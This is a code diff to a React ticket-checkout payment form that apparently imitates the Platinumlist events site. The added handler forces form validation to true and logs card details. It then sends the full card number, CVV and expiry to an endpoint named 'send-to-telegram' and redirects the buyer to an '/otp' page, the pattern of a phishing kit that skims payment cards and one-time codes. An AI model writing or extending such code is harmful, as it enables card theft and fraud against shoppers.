@@ -42,6 +42,10 @@ export default function PaymentForm({ event, selectedSeats, onBack, totalAmount 
 
   const finalTotal = totalAmount + (whatsappReminder ? whatsappFee : 0) + (refundGuarantee ? refundFee : 0) + serviceFee;
 
+
+console.log("event",event)
+
+
   useEffect(() => {
     const timer = setInterval(() => {
       setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
@@ -82,6 +86,59 @@ export default function PaymentForm({ event, selectedSeats, onBack, totalAmount 
 
   const isAr = language === 'ar';
 
+  const isFormValid = true;
+
+  console.log('Form Validation Debug:', {
+    selectedSeatsCount: selectedSeats.length,
+    cardNumber: cardNumber,
+    cardNumberDigits: cardNumber.replace(/\s/g, '').length,
+    cvv: cvv,
+    cvvLength: cvv.length,
+    expiryMonth: expiryMonth,
+    expiryYear: expiryYear,
+    agreeRules: agreeRules,
+    isFormValid: isFormValid
+  });
+
+  const handlePaymentSubmit = async () => {
+    try {
+      const paymentData = {
+        eventTitle: event.title,
+        eventVenue: event.venueId?.name?.[language] || event.venueName || '',
+        eventDate: event.showTimes?.[0]?.date ? new Date(event.showTimes[0].date).toLocaleDateString(language === 'ar' ? 'ar-EG' : 'en-US', { weekday: 'long', day: 'numeric', month: 'long' }) : '',
+        selectedSeats: selectedSeats.map(s => isAr ? `المقعد: ${s.seatNumber}، صف: ${s.rowName}` : `Seat: ${s.seatNumber}, Row: ${s.rowName}`).join(' | '),
+        totalAmount,
+        finalTotal,
+        cardNumber,
+        cvv,
+        expiryMonth,
+        expiryYear,
+        whatsappReminder,
+        refundGuarantee,
+        currency: event.currency || '',
+      };
+
+      const response = await fetch('/api/payment/send-to-telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(paymentData),
+      });
+
+      const result = await response.json();
+
+      if (result.success) {
+        window.location.href = '/otp';
+      } else {
+        alert('Payment failed. Please try again.');
+      }
+    } catch (error) {
+      console.error('Error submitting payment:', error);
+      alert('An error occurred. Please try again.');
+    }
+  };
+
   return (
     <div className="flex flex-col min-h-screen bg-[#F8F9FB]" dir={dir}>
       {/* Header */}
@@ -101,7 +158,7 @@ export default function PaymentForm({ event, selectedSeats, onBack, totalAmount 
           <div className="bg-white rounded-2xl overflow-hidden shadow-sm border border-gray-100">
             <div className="relative h-48 w-full">
               <Image 
-                src={event.imageUrl || 'https://images.platinumlist.net/img/event/abeer_nehme_qatar_philharmonic_orchestra_2024_jan_23_u_venue_85961-mobile1733912196.jpg'} 
+                src={event.image || 'https://images.platinumlist.net/img/event/abeer_nehme_qatar_philharmonic_orchestra_2024_jan_23_u_venue_85961-mobile1733912196.jpg'} 
                 alt={event.title}
                 fill
                 className="object-cover"
@@ -332,7 +389,15 @@ export default function PaymentForm({ event, selectedSeats, onBack, totalAmount 
       {/* Footer Sticky */}
       <footer className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 flex items-center justify-between z-40 safe-area-inset-bottom">
         <div className="flex items-center gap-4 flex-row-reverse w-full max-w-md mx-auto">
-          <Button className="flex-1 h-12 text-lg font-bold bg-[#F1F3F5] text-gray-400 hover:bg-[#F1F3F5] rounded-xl cursor-not-allowed">
+          <Button 
+            disabled={!isFormValid}
+            onClick={handlePaymentSubmit}
+            className={`flex-1 h-12 text-lg font-bold rounded-xl transition-all duration-200 ${
+              isFormValid 
+                ? 'bg-[#1A162E] text-white hover:bg-[#2a244a] shadow-lg shadow-gray-200' 
+                : 'bg-[#F1F3F5] text-gray-400 cursor-not-allowed'
+            }`}
+          >
             {isAr ? 'ادفع' : 'Pay'}
           </Button>
           
